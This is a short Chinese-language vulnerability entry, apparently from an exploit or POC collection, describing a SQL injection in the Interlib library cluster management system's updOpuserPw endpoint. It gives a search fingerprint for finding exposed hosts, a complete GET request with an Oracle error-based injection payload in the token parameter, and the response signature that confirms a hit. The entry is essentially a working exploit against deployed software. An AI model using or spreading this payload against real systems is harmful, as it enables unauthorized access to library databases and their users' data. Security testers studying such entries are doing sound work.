# Interlib图书馆集群管理系统updOpuserPwtokenSQL注入漏洞

Interlib ｜ SQL注入 ｜ —
- **指纹**：`body="interlib"`
- **请求**：`GET /interlib3/service/sysop/updOpuserPw?loginid=123&newpassword=123&token=1%27and+ctxsys.drithsx.sn(1,(select%201024*1024%20from%20dual))=%272 HTTP/1.1`
- **响应特征**：200 1048576